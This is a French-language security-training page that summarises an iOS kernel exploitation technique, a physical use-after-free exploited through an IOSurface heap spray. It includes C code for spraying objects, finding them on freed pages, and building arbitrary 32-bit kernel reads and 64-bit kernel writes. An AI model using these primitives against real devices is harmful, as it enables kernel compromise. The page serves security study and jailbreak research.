# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

Ceci est un résumé de l’article disponible sur [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html). De plus, des informations complémentaires sur des exploits utilisant cette technique se trouvent sur [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Gestion de la mémoire dans XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

L’**espace d’adresses mémoire virtuelle** pour les process utilisateur sur iOS s’étend de **0x0 à 0x8000000000**. Cependant, ces adresses ne correspondent pas directement à la mémoire physique. Le **kernel** utilise des **page tables** pour traduire les adresses virtuelles en adresses **physiques** réelles.

#### Niveaux des page tables sur iOS

Les page tables sont organisées hiérarchiquement en trois niveaux :

1. **L1 Page Table (Level 1)** :
* Chaque entrée représente une large plage de mémoire virtuelle.
* Elle couvre **0x1000000000 bytes** (soit **256 GB**) de mémoire virtuelle.
2. **L2 Page Table (Level 2)** :
* Une entrée représente une région plus petite de mémoire virtuelle, spécifiquement **0x2000000 bytes** (32 MB).
* Une entrée L1 peut pointer vers une table L2 si elle ne peut pas mapper toute la région elle-même.
3. **L3 Page Table (Level 3)** :
* C’est le niveau le plus fin, où chaque entrée mappe une page mémoire de **4 KB**.
* Une entrée L2 peut pointer vers une table L3 si un contrôle plus granulaire est nécessaire.

#### Mapper le virtuel vers le physique

* **Direct Mapping (Block Mapping)** :
* Certaines entrées dans une page table mapent directement une plage d’adresses virtuelles vers une plage contiguë d’adresses physiques (comme un raccourci).
* **Pointeur vers une child page table** :
* Si un contrôle plus fin est requis, une entrée à un niveau (par ex. L1) peut pointer vers une **child page table** au niveau suivant (par ex. L2).

#### Exemple : résolution d’une adresse virtuelle

Supposons que vous accédiez à l’adresse virtuelle **0x1000000000** :

1. **L1 Table** :
* Le kernel vérifie l’entrée de la table L1 correspondant à cette adresse virtuelle. Si elle contient un **pointeur vers une L2 page table**, il se rend dans cette L2.
2. **L2 Table** :
* Le kernel vérifie la L2 pour un mapping plus détaillé. Si cette entrée pointe vers une **L3 page table**, il continue vers celle-ci.
3. **L3 Table** :
* Le kernel consulte l’entrée finale de L3, qui pointe vers l’**adresse physique** de la page mémoire réelle.

#### Exemple de mapping d’adresses

Si vous écrivez l’adresse physique **0x800004000** dans le premier index de la table L2, alors :

* Les adresses virtuelles de **0x1000000000** à **0x1002000000** sont mappées vers les adresses physiques de **0x800004000** à **0x802004000**.
* Il s’agit d’un **block mapping** au niveau L2.

Alternativement, si l’entrée L2 pointe vers une table L3 :

* Chaque page de 4 KB dans la plage virtuelle **0x1000000000 -> 0x1002000000** serait mappée par des entrées individuelles dans la table L3.

### Physical use-after-free

Un **physical use-after-free** (UAF) se produit lorsque :

1. Un process **alloue** de la mémoire en lecture/écriture.
2. Les **page tables** sont mises à jour pour mapper cette mémoire à une adresse physique spécifique accessible par le process.
3. Le process **désalloue** (libère) la mémoire.
4. Cependant, en raison d’un **bug**, le kernel **oublie de supprimer le mapping** des page tables, alors même qu’il marque la mémoire physique correspondante comme libre.
5. Le kernel peut alors **réallouer cette mémoire physique "libérée"** pour d’autres usages, comme des données kernel.
6. Comme le mapping n’a pas été supprimé, le process peut toujours **lire et écrire** cette mémoire physique.

Cela signifie que le process peut accéder à des **pages de mémoire kernel**, qui peuvent contenir des données sensibles ou des structures, permettant potentiellement à un attaquant de **manipuler la mémoire kernel**.

### IOSurface Heap Spray

Étant donné que l’attaquant ne peut pas contrôler quelles pages kernel spécifiques seront allouées à la mémoire libérée, il utilise une technique appelée **heap spray** :

1. L’attaquant **crée un grand nombre d’objets IOSurface** dans la mémoire kernel.
2. Chaque objet IOSurface contient une **valeur magique** dans l’un de ses champs, ce qui facilite son identification.
3. Ils **scannent les pages libérées** pour voir si l’un de ces objets IOSurface a été placé sur une page libérée.
4. Lorsqu’ils trouvent un objet IOSurface sur une page libérée, ils peuvent l’utiliser pour **lire et écrire la mémoire kernel**.

Plus d’infos à ce sujet sur [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Notez que les appareils iOS 16+ (A12+) apportent des mitigations matérielles (comme PPL ou SPTM) qui rendent les techniques de physical UAF beaucoup moins viables.
> PPL applique des protections MMU strictes sur les pages liées au code signing, aux entitlements et aux données kernel sensibles : même si une page est réutilisée, les écritures depuis userland ou depuis du code kernel compromis vers des pages protégées par PPL sont bloquées.
> Secure Page Table Monitor (SPTM) étend PPL en renforçant les mises à jour des page tables elles-mêmes. Il garantit que même du code kernel privilégié ne peut pas remapper silencieusement des pages libérées ou altérer des mappings sans passer par des vérifications sécurisées.
> KTRR (Kernel Text Read-Only Region) verrouille la section code du kernel en lecture seule après le boot. Cela empêche toute modification à l’exécution du code kernel, fermant un vecteur d’attaque majeur sur lequel les exploits physical UAF s’appuient souvent.
> De plus, les allocations `IOSurface` sont moins prévisibles et plus difficiles à mapper dans des régions accessibles par l’utilisateur, ce qui rend la technique de “scan de valeur magique” beaucoup moins fiable. Et `IOSurface` est désormais protégé par des entitlements et des restrictions de sandbox.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects** : L’attaquant crée de nombreux objets IOSurface avec un identifiant spécial (« valeur magique »).
2. **Scan Freed Pages** : Il vérifie si l’un des objets a été alloué sur une page libérée.
3. **Read/Write Kernel Memory** : En manipulant les champs de l’objet IOSurface, il obtient la capacité d’effectuer des **lectures et écritures arbitraires** en mémoire kernel. Cela lui permet de :
* Utiliser un champ pour **lire n’importe quelle valeur 32 bits** en mémoire kernel.
* Utiliser un autre champ pour **écrire des valeurs 64 bits**, obtenant ainsi un primitive stable de **kernel read/write**.

Générez des objets IOSurface avec la valeur magique IOSURFACE\_MAGIC pour les rechercher ensuite :
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Rechercher des objets **`IOSurface`** dans une page physique libérée :
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Obtenir Kernel Read/Write avec IOSurface

Après avoir pris le contrôle d'un objet IOSurface dans kernel memory (mappé sur une page physique libérée accessible depuis userspace), nous pouvons l'utiliser pour **arbitrary kernel read and write operations**.

**Champs clés dans IOSurface**

L'objet IOSurface contient deux champs cruciaux :

1. **Use Count Pointer** : Permet un **32-bit read**.
2. **Indexed Timestamp Pointer** : Permet un **64-bit write**.

En écrasant ces pointeurs, nous les redirigeons vers des adresses arbitraires dans kernel memory, ce qui permet des capacités de read/write.

#### 32-Bit Kernel Read

Pour effectuer une lecture :

1. Écrasez le **use count pointer** pour qu'il pointe vers l'adresse cible moins un 0x14-byte offset.
2. Utilisez la méthode `get_use_count` pour lire la valeur à cette adresse.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### Écriture 64 bits du Kernel

Pour effectuer une écriture :

1. Écraser le **indexed timestamp pointer** par l'adresse cible.
2. Utilisez la méthode `set_indexed_timestamp` pour écrire une valeur 64 bits.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Récapitulatif du flux d'exploit

1. **Trigger Physical Use-After-Free**: Des pages libérées sont disponibles pour réutilisation.
2. **Spray IOSurface Objects**: Allouer de nombreux objets IOSurface avec une "magic value" unique dans kernel memory.
3. **Identify Accessible IOSurface**: Localiser un IOSurface sur une page libérée que vous contrôlez.
4. **Abuse Use-After-Free**: Modifier des pointeurs dans l'objet IOSurface pour permettre des **kernel read/write** arbitraires via les méthodes IOSurface.

Avec ces primitives, l'exploit fournit des **32-bit reads** contrôlés et des **64-bit writes** vers kernel memory. Des étapes de jailbreak supplémentaires pourraient impliquer des primitives de read/write plus stables, ce qui peut nécessiter de contourner des protections additionnelles (par ex., PPL sur les nouveaux appareils arm64e).

{{#include ../../banners/hacktricks-training.md}}
